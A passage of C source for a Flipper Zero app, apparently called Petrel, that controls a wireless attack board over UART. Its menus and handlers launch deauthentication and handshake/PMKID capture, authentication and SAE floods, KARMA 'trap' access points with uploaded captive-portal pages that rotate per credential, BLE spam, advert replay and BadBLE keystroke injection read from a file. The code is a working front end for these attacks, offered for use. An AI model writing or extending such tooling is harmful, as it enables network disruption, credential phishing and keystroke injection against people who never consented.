        snprintf(message, sizeof(message), "Low memory");
        snprintf(popupHeader, sizeof(popupHeader), "Portal");
        scene_manager_next_scene(app->scene_manager, popupScene);
        return;
    }
    Storage* st = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(st);
    size_t n = 0;
    bool too_big = false;
    if(storage_file_open(f, path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        too_big = storage_file_size(f) > PORTAL_MAX;
        if(!too_big) n = storage_file_read(f, buf, PORTAL_MAX);
        storage_file_close(f);
    }
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
    if(too_big) {
        free(buf);
        snprintf(message, sizeof(message), "Too big (max %d B)", PORTAL_MAX);
        snprintf(popupHeader, sizeof(popupHeader), "Portal");
        scene_manager_next_scene(app->scene_manager, popupScene);
        return;
    }
    if(n == 0) {
        free(buf);
        snprintf(message, sizeof(message), "Failed to read");
        snprintf(popupHeader, sizeof(popupHeader), "Portal");
        scene_manager_next_scene(app->scene_manager, popupScene);
        return;
    }
    uart_helper_send(app->uart_helper, "PORTALCLEAR\n", 12);
    furi_delay_ms(120);
    // Back-to-back chunks (uart_helper_send paces at 115200; no per-chunk delay -> no hang).
    static char chunk[16 + 2 * 256 + 4];
    size_t off = 0;
    while(off < n) {
        size_t cl = n - off;
        if(cl > 256) cl = 256;
        int p = snprintf(chunk, sizeof(chunk), "PORTALHTML ");
        for(size_t i = 0; i < cl; i++) p += snprintf(chunk + p, sizeof(chunk) - p, "%02x", buf[off + i]);
        chunk[p++] = '\n';
        uart_helper_send(app->uart_helper, chunk, p);
        off += cl;
    }
    furi_delay_ms(120);
    app->captivePortal = 6; // Custom(file): selected + used on the next AP start
    uart_helper_send(app->uart_helper, "PORTAL 6\n", 9);
    // Verify the upload: hash the exact bytes we streamed with the same FNV-1a the board uses
    // and ask it to report its own hash. The reply is handled in uart_process_line.
    uint32_t h = 2166136261u;
    for(size_t i = 0; i < n; i++) {
        h ^= (uint8_t)buf[i];
        h *= 16777619u;
    }
    portal_exp_hash = h;
    portal_exp_len = (uint16_t)n;
    furi_delay_ms(60);
    uart_helper_send(app->uart_helper, "PORTALHASH\n", 11);
    free(buf);
    // Return to the Create-AP screen (re-entered -> Portal Type now shows "Custom (file)")
    scene_manager_previous_scene(app->scene_manager);
}

static void portal_item_cb(void* context, uint32_t index) {
    Petrel* app = context;
    if((int)index < portal_file_count) petrel_load_portal_file(app, portal_names[index]);
}
void portal_list_scene_on_enter(void* context) {
    Petrel* app = context;
    portal_list_load();
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "Portals");
    if(portal_file_count == 0) {
        submenu_add_item(app->submenu, "No .html in /ext/petrel/portals", 0, portal_item_cb, app);
    } else {
        for(int i = 0; i < portal_file_count; i++)
            submenu_add_item(app->submenu, portal_names[i], (uint32_t)i, portal_item_cb, app);
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, toolsListView);
}
bool portal_list_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}
void portal_list_scene_on_exit(void* context) {
    UNUSED(context);
}


// #5: BLE adv library — save/replay multiple adverts in /ext/petrel/adv.txt (one hex/line).
static int petrel_adv_load(char lines[8][80]) {
    int n = 0;
    Storage* st = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(st);
    if(storage_file_open(f, "/ext/petrel/adv.txt", FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buf[640];
        size_t rd = storage_file_read(f, buf, sizeof(buf) - 1);
        buf[rd] = '\0';
        storage_file_close(f);
        size_t i = 0;
        while(n < 8) {
            while(i < rd && (buf[i] == '\r' || buf[i] == '\n')) i++;
            if(i >= rd) break;
            size_t s = i;
            while(i < rd && buf[i] != '\r' && buf[i] != '\n') i++;
            size_t len = i - s;
            if(len > 79) len = 79;
            memcpy(lines[n], buf + s, len);
            lines[n][len] = '\0';
            n++;
        }
    }
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
    return n;
}

static void petrel_adv_save(Petrel* app) {
    if(app->bleAdvHex[0] == '\0') return;
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel");
    File* f = storage_file_alloc(st);
    if(storage_file_open(f, "/ext/petrel/adv.txt", FSAM_WRITE, FSOM_OPEN_APPEND)) {
        storage_file_write(f, app->bleAdvHex, strlen(app->bleAdvHex));
        storage_file_write(f, "\n", 1);
        storage_file_close(f);
    }
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
}

static void petrel_adv_replay(Petrel* app) {
    char lines[8][80];
    int n = petrel_adv_load(lines);
    if(n == 0) {
        snprintf(message, sizeof(message), "No saved advert");
    } else {
        char cmd[100];
        snprintf(cmd, sizeof(cmd), "BLEADV %s 30\n", lines[n - 1]);
        uart_helper_send(app->uart_helper, cmd, strlen(cmd));
        snprintf(message, sizeof(message), "Adv replay sent");
    }
    snprintf(popupHeader, sizeof(popupHeader), "BLE Adv");
    scene_manager_next_scene(app->scene_manager, popupScene);
}

static char adv_lines[8][80];
static int adv_n = 0;
static void ble_adv_lib_cb(void* context, uint32_t index) {
    Petrel* app = context;
    if((int)index < adv_n) {
        char cmd[100];
        snprintf(cmd, sizeof(cmd), "BLEADV %s 30\n", adv_lines[index]);
        uart_helper_send(app->uart_helper, cmd, strlen(cmd));
        snprintf(message, sizeof(message), "Adv replay");
        snprintf(popupHeader, sizeof(popupHeader), "BLE Adv");
        scene_manager_next_scene(app->scene_manager, popupScene);
    } else {
        Storage* st = furi_record_open(RECORD_STORAGE);
        File* f = storage_file_alloc(st);
        if(storage_file_open(f, "/ext/petrel/adv.txt", FSAM_WRITE, FSOM_CREATE_ALWAYS))
            storage_file_close(f);
        storage_file_free(f);
        furi_record_close(RECORD_STORAGE);
        scene_manager_previous_scene(app->scene_manager);
    }
}
void ble_adv_lib_scene_on_enter(void* context) {
    Petrel* app = context;
    adv_n = petrel_adv_load(adv_lines);
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "Saved adverts");
    for(int i = 0; i < adv_n; i++)
        submenu_add_item(app->submenu, adv_lines[i], (uint32_t)i, ble_adv_lib_cb, app);
    submenu_add_item(app->submenu, "Clear saved", (uint32_t)adv_n, ble_adv_lib_cb, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, toolsListView);
}
bool ble_adv_lib_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}
void ble_adv_lib_scene_on_exit(void* context) {
    UNUSED(context);
}

static void petrel_adv_input_cb(void* context) {
    // text_input already wrote the typed hex into app->bleAdvHex on save.
    Petrel* app = context;
    char cmd[100];
    snprintf(cmd, sizeof(cmd), "BLEADV %s 30\n", app->bleAdvHex);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    petrel_adv_save(app);
    scene_manager_previous_scene(app->scene_manager);
}

void ble_adv_input_scene_on_enter(void* context) {
    Petrel* app = context;
    text_input_reset(app->text_input);
    text_input_set_header_text(app->text_input, "BLE adv hex (AD bytes)");
    text_input_set_result_callback(
        app->text_input,
        petrel_adv_input_cb,
        app,
        app->bleAdvHex,
        sizeof(app->bleAdvHex) - 1,
        false);
    view_dispatcher_switch_to_view(app->view_dispatcher, bssidTextInputView);
}
bool ble_adv_input_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}
void ble_adv_input_scene_on_exit(void* context) {
    UNUSED(context);
}

static void petrel_badble_file(Petrel* app) {
    Storage* st = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(st);
    uint8_t buf[96]; size_t n = 0;
    if(storage_file_open(f, "/ext/petrel/badble.txt", FSAM_READ, FSOM_OPEN_EXISTING)) {
        n = storage_file_read(f, buf, sizeof(buf));
        storage_file_close(f);
    }
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
    if(n == 0) {
        snprintf(message, sizeof(message), "Put text at\n/ext/petrel/badble.txt");
        snprintf(popupHeader, sizeof(popupHeader), "BadBLE");
        scene_manager_next_scene(app->scene_manager, popupScene);
        return;
    }
    char hex[200] = "";
    for(size_t i = 0; i < n; i++) snprintf(hex + i * 2, 3, "%02x", buf[i]);
    char cmd[230];
    snprintf(cmd, sizeof(cmd), "BADBLE 60 %s\n", hex);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    snprintf(message, sizeof(message), "BadBLE %u B", (unsigned)n);
    snprintf(popupHeader, sizeof(popupHeader), "BadBLE");
    scene_manager_next_scene(app->scene_manager, popupScene);
}

static void petrel_ibeacon_input_cb(void* context) {
    Petrel* app = context;
    char cmd[80];
    snprintf(cmd, sizeof(cmd), "BLEIBEACON %s 1 1 30\n", app->ibeaconUuid);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    scene_manager_previous_scene(app->scene_manager);
}

void ibeacon_input_scene_on_enter(void* context) {
    Petrel* app = context;
    text_input_reset(app->text_input);
    text_input_set_header_text(app->text_input, "iBeacon UUID (32 hex)");
    text_input_set_result_callback(
        app->text_input,
        petrel_ibeacon_input_cb,
        app,
        app->ibeaconUuid,
        sizeof(app->ibeaconUuid) - 1,
        false);
    view_dispatcher_switch_to_view(app->view_dispatcher, bssidTextInputView);
}
bool ibeacon_input_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}
void ibeacon_input_scene_on_exit(void* context) {
    UNUSED(context);
}

static void petrel_ble_scan(Petrel* app) {
    recon_text[0] = '\0';
    ble_list_n = 0;   // D1: fresh device list for GATT enumerate
    snprintf(recon_title, sizeof(recon_title), "BLE");
    uart_helper_send(app->uart_helper, "BLESCAN 8\n", 10);
    petrel_busy(app, "BLE", "Scanning BLE...");
}
static void petrel_ibeacon_default(Petrel* app) {
    const char* c = "BLEIBEACON 0102030405060708090A0B0C0D0E0F10 1 1 30\n";
    uart_helper_send(app->uart_helper, c, strlen(c));
    petrel_busy(app, "BLE", "iBeacon 30s...");
}
static void petrel_badble_run(Petrel* app) {
    uart_helper_send(app->uart_helper, "BADBLE 30\n", 10);
    petrel_busy(app, "BadBLE", "BadBLE 30s...");
}

static void wifi_hub_cb(void* context, uint32_t index) {
    Petrel* app = context;
    switch(index) {
    case 0:
        // Heap guard (2026-10-28 hardware run). Checked HERE, before the scene is pushed: entering
        // a scene transiently costs ~20 KB on this FAP (the incoming view's buffers are allocated
        // before the outgoing one's are released), so a check inside scan_networks_scene_on_enter
        // always saw the transient floor and refused every scan. At the observed floor during a
        // scan start (free ~4.8 KB, largest block ~1.7 KB) the busy path OOM-crashed the Flipper.
        if(memmgr_get_free_heap() < 8192 || memmgr_heap_get_max_free_block() < 4096) {
            diag(41, (uint32_t)memmgr_get_free_heap(),
                 (uint32_t)memmgr_heap_get_max_free_block()); /* scan refused: low heap */
            snprintf(popupHeader, sizeof(popupHeader), "Low memory");
            snprintf(
                message,
                sizeof(message),
                "%lu B free. Reboot, then scan.",
                (unsigned long)memmgr_get_free_heap());
            post_event(app, PETREL_EVT_POPUP);
            break;
        }
        scene_manager_next_scene(app->scene_manager, scanNetworksScene);
        break;
    case 1: scene_manager_next_scene(app->scene_manager, listNetworksScene); break;
    case 2: scene_manager_next_scene(app->scene_manager, channelMapScene); break;
    case 3: scene_manager_next_scene(app->scene_manager, configAPScene); break;
    case 4: scene_manager_next_scene(app->scene_manager, beaconNetworkScene); break;
    case 5: scene_manager_next_scene(app->scene_manager, portalListScene); break;
    case 6: petrel_apclone(app); break;
    case 7: petrel_probeflood(app); break;
    case 8: scene_manager_next_scene(app->scene_manager, settingsScene); break;
    case 9: scene_manager_next_scene(app->scene_manager, sessionScene); break;
    case 10: browse_reset = true; scene_manager_next_scene(app->scene_manager, browseScene); break;
    case 11: karma_trap = false; scene_manager_next_scene(app->scene_manager, karmaScene); break;
    case 12: karma_trap = true;  scene_manager_next_scene(app->scene_manager, karmaScene); break;
    case 13: scene_manager_next_scene(app->scene_manager, scriptListScene); break;
    case 14: scene_manager_next_scene(app->scene_manager, recordScene); break;
    case 15: scene_manager_next_scene(app->scene_manager, toolsMenuScene); break;
    case 16: scene_manager_next_scene(app->scene_manager, batchScene); break;
    }
}
// Re-ask the board for its IDENT while we have not heard back yet. The board answers HELLO
// with "IDENT:brand=PETREL;fw=..;caps=..;board=BW16"; the app sends HELLO once at startup, and
// if that reply is missed (board still booting) the UI stayed on "(no IDENT)" forever.
// Retrying on each main/hub/help entry makes it self-heal.
static void petrel_ident(Petrel* app) {
    // NOTE: no diag() here. This function is called from the 10 ms tick, and logging at its top meant
    // logging on EVERY call - including the early returns - which wrote ~100 records/s to the SD and
    // slowed the app enough to lose injected keys. The retry path already logs kind 18 when it
    // actually transmits, which is the event worth recording.

    // Bounded (architect): at most three attempts, 3 s apart, and never again once identified. The
    // previous version retried forever while fw_caps stayed empty - every 3 s, for the whole session,
    // and each call oscillated the free heap by ~6 KB, which is what made allocations fail later.
    // 2026-10-28: keep trying, slowly, instead of giving up after three. The board now re-arms its
    // Serial1 after 10 s of silence (firmware self-heal), so a link that died in a Flipper reboot
    // comes back on its own — but only if the app is still asking. 3 quick tries at boot, then one
    // every 10 s (capped at 20 so an absent board cannot churn the heap forever).
    if(app->fw_caps[0] != '\0' || app->ident_attempts >= 20) return;
    uint32_t now = furi_get_tick();
    uint32_t ident_gap_ms = (app->ident_attempts < 3) ? 3000u : 10000u;
    if(app->ident_attempts != 0 &&
       (uint32_t)(now - app->ident_last_tick) < furi_ms_to_ticks(ident_gap_ms))
        return;
    app->ident_last_tick = now;
    app->ident_attempts++;
    if(app->ident_attempts > 1) diag(18, app->ident_attempts, 0);
    uart_helper_send(app->uart_helper, "HELLO\n", 6);
}

// C2: tell the board which portal to serve. "Rotate" (index CAPTIVE_PORTAL_SIZE-1) enables the
// firmware's per-credential rotation instead of a fixed page.
static void petrel_send_portal_sel(Petrel* app) {
    if(app->captivePortal == CAPTIVE_PORTAL_SIZE - 1) {
        uart_helper_send(app->uart_helper, "PORTALROT 1\n", 12);
        uart_helper_send(app->uart_helper, "PORTAL 0\n", 9);
    } else {
        uart_helper_send(app->uart_helper, "PORTALROT 0\n", 12);
        char c[16];
        snprintf(c, sizeof(c), "PORTAL %d\n", app->captivePortal);
        uart_helper_send(app->uart_helper, c, strlen(c));
    }
}

void wifi_hub_scene_on_enter(void* context) {
    Petrel* app = context;

    // Self-heal "unidentified": the 3 startup IDENT attempts all land in the ~9s UART warm-up right
    // after launch, when the board never receives the HELLO (confirmed: board silent during that
    // window), so the app gives up forever and the Tools menu stays capability-gated to a stub. The
    // link IS settled by the time the user reaches a hub, so allow a fresh BOUNDED round here (reset
    // to 0 -> petrel_ident fires up to 3 again, 3s apart; stops the instant IDENT arrives). Restores
    // the "retry on hub entry self-heals" intent the attempt-cap had silently broken.
    if(app->fw_caps[0] == '\0') app->ident_attempts = 0;
    petrel_ident(app);
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "Wi-Fi");
    submenu_add_item(app->submenu, "Scan Wifi", 0, wifi_hub_cb, app);
    submenu_add_item(app->submenu, "List Wifi", 1, wifi_hub_cb, app);
    // The capture/recon Tools menu used to be reachable only through AP info -> Edit, and that
    // info screen currently resets the device on this firmware (see the PETREL_EVT_INFO_* note),
    // so the whole menu was unreachable. Give it a first-class entry here.
    submenu_add_item(app->submenu, "Tools (capture / recon)", 15, wifi_hub_cb, app);
    submenu_add_item(app->submenu, "Batch grab (multi-AP)", 16, wifi_hub_cb, app);
    submenu_add_item(app->submenu, "Channel Map", 2, wifi_hub_cb, app);
    submenu_add_item(app->submenu, "Create AP", 3, wifi_hub_cb, app);
    submenu_add_item(app->submenu, "Send Beacon", 4, wifi_hub_cb, app);
    if(petrel_has_cap(app, 'E'))
        submenu_add_item(app->submenu, "Load Portal", 5, wifi_hub_cb, app);
    if(petrel_has_cap(app, 'B')) {
        submenu_add_item(app->submenu, "AP Clone (spam)", 6, wifi_hub_cb, app);
        submenu_add_item(app->submenu, "Probe flood", 7, wifi_hub_cb, app);
    }
    submenu_add_item(app->submenu, "Settings", 8, wifi_hub_cb, app);
    submenu_add_item(app->submenu, "Session summary", 9, wifi_hub_cb, app);
    submenu_add_item(app->submenu, "Browse sessions", 10, wifi_hub_cb, app);
    if(petrel_has_cap(app, 'R')) {  // B1/C1: firmware advertises the KARMA responder with "R"
        submenu_add_item(app->submenu, "KARMA (responder)", 11, wifi_hub_cb, app);
        submenu_add_item(app->submenu, "Trap (KARMA+portal)", 12, wifi_hub_cb, app);
    }
    submenu_add_item(app->submenu, "Run script", 13, wifi_hub_cb, app);
    submenu_add_item(app->submenu, "Macro (record)", 14, wifi_hub_cb, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, toolsListView);
}
bool wifi_hub_scene_on_event(void* context, SceneManagerEvent event) {
    // 2026-10-29: send STOP only when the hub is POPPED (BACK to the main menu), not when a child
    // scene opens. on_exit also runs on next_scene, so putting STOP there killed the scan the
    // moment its busy scene opened ("Scanning networks..." then straight back to the hub).
    Petrel* app = context;
    if(event.type == SceneManagerEventTypeBack) {
        uart_helper_send(app->uart_helper, "STOP\n", 5);
    }
    return false;
}
void wifi_hub_scene_on_exit(void* context) {
    UNUSED(context);
}

static void ble_hub_cb(void* context, uint32_t index) {
    Petrel* app = context;
    switch(index) {
    case 0: petrel_ble_scan(app); break;
    case 1: petrel_ibeacon_default(app); break;
    case 2: scene_manager_next_scene(app->scene_manager, ibeaconInputScene); break;
    case 3: petrel_badble_run(app); break;
    case 4: petrel_badble_file(app); break;
    case 5: scene_manager_next_scene(app->scene_manager, bleAdvInputScene); break;
    case 6: petrel_adv_replay(app); break;
    case 7: scene_manager_next_scene(app->scene_manager, bleAdvLibScene); break;
    case 8: scene_manager_next_scene(app->scene_manager, gattScene); break;
    case 9: scene_manager_next_scene(app->scene_manager, blespamScene); break;
    case 10: scene_manager_next_scene(app->scene_manager, trackerScene); break;
    }
}
void ble_hub_scene_on_enter(void* context) {
    Petrel* app = context;
    petrel_ident(app);
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "BLE");
    submenu_add_item(app->submenu, "BLE Scan", 0, ble_hub_cb, app);
    submenu_add_item(app->submenu, "iBeacon (demo)", 1, ble_hub_cb, app);
    submenu_add_item(app->submenu, "iBeacon UUID", 2, ble_hub_cb, app);
    submenu_add_item(app->submenu, "BadBLE HID", 3, ble_hub_cb, app);
    submenu_add_item(app->submenu, "BadBLE file", 4, ble_hub_cb, app);
    submenu_add_item(app->submenu, "BLE Adv (hex)", 5, ble_hub_cb, app);
    submenu_add_item(app->submenu, "BLE Adv replay", 6, ble_hub_cb, app);
    submenu_add_item(app->submenu, "Saved adverts", 7, ble_hub_cb, app);
    submenu_add_item(app->submenu, "GATT enumerate", 8, ble_hub_cb, app);
    submenu_add_item(app->submenu, "BLE Spam", 9, ble_hub_cb, app);
    submenu_add_item(app->submenu, "Trackers", 10, ble_hub_cb, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, toolsListView);
}
bool ble_hub_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}
void ble_hub_scene_on_exit(void* context) {
    UNUSED(context);
}

static void petrel_toggle_hop(Petrel* app) {
    hop_on = !hop_on;
    uart_helper_send(app->uart_helper, hop_on ? "HOP 500\n" : "HOP 0\n", hop_on ? 8 : 6);
    snprintf(message, sizeof(message), "Channel hop %s", hop_on ? "on" : "off");
    snprintf(popupHeader, sizeof(popupHeader), "Hop");
    scene_manager_next_scene(app->scene_manager, popupScene);
}

// Tools submenu: every active/recon action for the currently selected AP.
static void tools_item_callback(void* context, uint32_t index) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    switch(index) {
    case TOOL_CAPTURE: petrel_start_capture(app, false); break;
    case TOOL_GRAB: petrel_start_capture(app, true); break;
    case TOOL_AUDIT: petrel_start_audit(app); break;
    case TOOL_PMF: petrel_start_pmf(app); break;
    case TOOL_STA: petrel_start_sta(app); break;
    case TOOL_PROBE: petrel_start_probe(app); break;
    case TOOL_IDS: petrel_start_ids(app); break;
    case TOOL_CSA: petrel_csa(app); break;
    case TOOL_TRACK: petrel_track(app); break;
    case TOOL_BTM: petrel_btm(app); break;
    case TOOL_AUTHFLOOD: petrel_flood(app, false); break;
    case TOOL_ASSOCFLOOD: petrel_flood(app, true); break;
    case TOOL_SAEFLOOD: petrel_saeflood(app); break;
    case TOOL_PICKAP: scene_manager_next_scene(app->scene_manager, pickApScene); break;
    case TOOL_PMKID: petrel_start_pmkid(app, false); break;
    case TOOL_PKGRAB: petrel_start_pmkid(app, true); break;
    case TOOL_PKCLIENT: petrel_start_pmkid_clientless(app); break;
    case TOOL_HOP: petrel_toggle_hop(app); break;
    case TOOL_DAADD: petrel_deauth_add(app); break;
    case TOOL_DARUN: petrel_deauth_run(app); break;
    case TOOL_DASTOP: petrel_deauth_stop(app); break;
    case TOOL_CAPSTOP: petrel_capture_stop(app); break;
    case TOOL_STOP:
        uart_helper_send(app->uart_helper, "STOP\n", 5);
        snprintf(message, sizeof(message), "Stopped / cleared");
        snprintf(popupHeader, sizeof(popupHeader), "Stop");
        scene_manager_next_scene(app->scene_manager, popupScene);
        break;
    }
}

void tools_menu_scene_on_enter(void* context) {
    Petrel* app = context;
    submenu_reset(app->submenu);
    // The header names the AP the tools are aimed at instead of the board's fw version: the
    // "Target:" row scrolls out of view as soon as you move down, and on an attack menu you want
    // to see what you are pointed at at all times. The band marker is there because the same SSID
    // shows up twice on a dual-band network. The fw version still lives in the session summary.
    char hdr[32];
    if(app->fw_caps[0] == '\0') {
        // No board (or one that has not answered): the capability-gated rows are gone, so say why.
        snprintf(hdr, sizeof(hdr), "Tools: unidentified");
    } else if(app->wifiCount > 0 && app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount) {
        snprintf(
            hdr,
            sizeof(hdr),
            "Tools: %s%.14s",
            (app->wifiList[app->selectedWifi].chanel > 14) ? "5G|" : "2G|",
            app->wifiList[app->selectedWifi].APssid);
    } else {
        snprintf(hdr, sizeof(hdr), "Tools: no target");
    }
    submenu_set_header(app->submenu, hdr);
    // Target first, and stable regardless of the caps below: every attack item needs
    // app->selectedWifi, which used to come only from the AP info screen's Edit button.
    {
        char tgt[44];
        if(app->wifiCount > 0 && app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount) {
            snprintf(
                tgt,
                sizeof(tgt),
                "Target: %.12s (ch %d)",
                app->wifiList[app->selectedWifi].APssid,
                app->wifiList[app->selectedWifi].chanel);
        } else {
            snprintf(tgt, sizeof(tgt), "Target: none (scan first)");
        }
        submenu_add_item(app->submenu, tgt, TOOL_PICKAP, tools_item_callback, app);
    }
    // Gate by the board's advertised caps; unknown fw (no IDENT) -> permissive.
    if(petrel_has_cap(app, 'H')) {
        submenu_add_item(app->submenu, "Capture HS (passive)", TOOL_CAPTURE, tools_item_callback, app);
        submenu_add_item(app->submenu, "Grab HS (deauth)", TOOL_GRAB, tools_item_callback, app);
        submenu_add_item(app->submenu, "PMKID (passive)", TOOL_PMKID, tools_item_callback, app);
        submenu_add_item(app->submenu, "PMKID grab (deauth)", TOOL_PKGRAB, tools_item_callback, app);
        submenu_add_item(app->submenu, "PMKID clientless (raw)", TOOL_PKCLIENT, tools_item_callback, app);
        submenu_add_item(app->submenu, "Capture: STOP", TOOL_CAPSTOP, tools_item_callback, app);
        submenu_add_item(app->submenu, "Guided audit (this AP)", TOOL_AUDIT, tools_item_callback, app);
    }
    if(petrel_has_cap(app, 'S')) {
        submenu_add_item(app->submenu, "PMF/WPA3 scan", TOOL_PMF, tools_item_callback, app);
        submenu_add_item(app->submenu, "STASCAN (stations)", TOOL_STA, tools_item_callback, app);
        submenu_add_item(app->submenu, "Probe sniff (PNL)", TOOL_PROBE, tools_item_callback, app);
    }
    if(petrel_has_cap(app, 'D')) {
        submenu_add_item(app->submenu, "Deauth list: + this AP", TOOL_DAADD, tools_item_callback, app);
        submenu_add_item(app->submenu, "Deauth list: RUN", TOOL_DARUN, tools_item_callback, app);
        submenu_add_item(app->submenu, "Deauth list: STOP", TOOL_DASTOP, tools_item_callback, app);
        submenu_add_item(app->submenu, "Deauth IDS", TOOL_IDS, tools_item_callback, app);
        submenu_add_item(app->submenu, "CSA attack (this AP)", TOOL_CSA, tools_item_callback, app);
        submenu_add_item(app->submenu, "Client tracker", TOOL_TRACK, tools_item_callback, app);
    }
    if(petrel_has_cap(app, 'T')) {
        submenu_add_item(app->submenu, "BTM attack (this AP)", TOOL_BTM, tools_item_callback, app);
    }
    submenu_add_item(app->submenu, "Channel hop on/off", TOOL_HOP, tools_item_callback, app);
    submenu_add_item(app->submenu, "Stop / clear", TOOL_STOP, tools_item_callback, app);
    if(petrel_has_cap(app, 'F')) {
        submenu_add_item(app->submenu, "Auth flood (this AP)", TOOL_AUTHFLOOD, tools_item_callback, app);
        submenu_add_item(app->submenu, "Assoc+sleep flood (this AP)", TOOL_ASSOCFLOOD, tools_item_callback, app);
    }
    if(petrel_has_cap(app, 'A')) {
        submenu_add_item(app->submenu, "SAE flood (this AP)", TOOL_SAEFLOOD, tools_item_callback, app);
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, toolsListView);
}

bool tools_menu_scene_on_event(void* context, SceneManagerEvent event) {
    Petrel* app = context;
    if(event.type == SceneManagerEventTypeCustom && event.event == PETREL_EVT_REIDENTIFIED) {
        // The identity arrived after this menu was built. Rebuild it in place - safe here, because
        // on_event runs between frames, not inside the menu's own input dispatch.
        tools_menu_scene_on_enter(app);
        return true;
    }
    return false;
}

void tools_menu_scene_on_exit(void* context) {
    UNUSED(context);
}

// Target AP picker for the capture/recon tools. The AP info screen resets this device on the
// installed firmware (see the note on PETREL_EVT_INFO_*), and Edit there was the only way to give
// the tools a target - so they were unusable. This is a plain submenu (the kind of screen that is
// stable here) and it sets the same app->selectedWifi the info screen would have set.
#define PICK_AP_MAX 24
static void pick_ap_cb(void* context, uint32_t index) {
    Petrel* app = context;
    if(app->wifiCount > 0 && index < (uint32_t)app->wifiCount) app->selectedWifi = (int)index;
    scene_manager_previous_scene(app->scene_manager);
}

void pick_ap_scene_on_enter(void* context) {
    Petrel* app = context;
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "Target AP");
    int n = app->wifiCount;
    if(n > PICK_AP_MAX) n = PICK_AP_MAX;
    if(n == 0) {
        submenu_add_item(app->submenu, "(none - run Scan Wifi)", 0, pick_ap_cb, app);
    }
    for(int i = 0; i < n; i++) {
        char temp[48];
        snprintf(
            temp,
            sizeof(temp),
            "%s%s|%.12s %d",
            app->wifiList[i].deauth ? "D|" : "",
            (app->wifiList[i].chanel > 14) ? "5G" : "2G",
            app->wifiList[i].APssid,
            app->wifiList[i].rssi);
        submenu_add_item(app->submenu, temp, (uint32_t)i, pick_ap_cb, app);
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, scannedWifisView);
}
bool pick_ap_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}
void pick_ap_scene_on_exit(void* context) {
    UNUSED(context);
}

void config_attack_change_call_back(void* context, uint32_t index) {
    FURI_LOG_D(TAG, __func__);
    FURI_LOG_D(TAG, "%p %ld", context, index);
    Petrel* app = context;
    if(index == 3) {
        scene_manager_next_scene(app->scene_manager, toolsMenuScene);
    } else if(index == 4) {
        scene_manager_next_scene(app->scene_manager, aPmacAddresScene);
    }
}

// --- E4: app settings, persisted to /ext/petrel/settings.txt ---------------------
// (globals live up top so scenes/helpers defined earlier can use them)
static void petrel_settings_save(void) {
    // The directory has to exist before the worker runs - it does not create directories - and
    // mkdir is cheap and idempotent, so it stays here. The write itself goes to the storage
    // worker: this is called from the settings list's change callbacks on the GUI thread, and it
    // used to write the card synchronously on every key press.
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel");
    furi_record_close(RECORD_STORAGE);

    char buf[128];
    int n = snprintf(
        buf,
        sizeof(buf),
        "channel=%s\nscan_wait=%d\nvibro=%d\nsave=%d\n",
        set_channels[set_channel_idx],
        set_scan_wait,
        set_vibro ? 1 : 0,
        set_save ? 1 : 0);
    char* snap = malloc((size_t)n);
    if(snap) {
        memcpy(snap, buf, (size_t)n);
        if(!storage_submit("/ext/petrel/settings.txt", snap, (size_t)n, false)) free(snap);
    }
}

static void petrel_settings_load(void) {
    Storage* st = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(st);
    if(storage_file_open(f, "/ext/petrel/settings.txt", FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buf[256];
        size_t n = storage_file_read(f, buf, sizeof(buf) - 1);
        buf[n] = '\0';
        storage_file_close(f);
        char* _sv = NULL;
        char* line = petrel_strtok(buf, "\n", &_sv);
        while(line) {
            if(!strncmp(line, "channel=", 8)) {
                int v = atoi(line + 8);
                for(int i = 0; i < SET_CHANNELS_N; i++)
                    if(atoi(set_channels[i]) == v) set_channel_idx = i;
            } else if(!strncmp(line, "scan_wait=", 10)) {
                int v = atoi(line + 10);
                set_scan_wait = (v < 5 || v > 30) ? 12 : v;
            } else if(!strncmp(line, "vibro=", 6)) {
                set_vibro = atoi(line + 6) != 0;
            } else if(!strncmp(line, "save=", 5)) {
                set_save = atoi(line + 5) != 0;
            }
            line = petrel_strtok(NULL, "\n", &_sv);
        }
    }
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
}

// --- In-app self-test (architect D.5) ---------------------------------------------------------
// A scripted navigation loop driven by the GUI tick. It uses the PRODUCTION hub callback
// (wifi_hub_cb) and scene_manager_previous_scene, and never calls a scene's on_enter() to fake a
// transition, so what it exercises is the production path. The first version drove the hub with
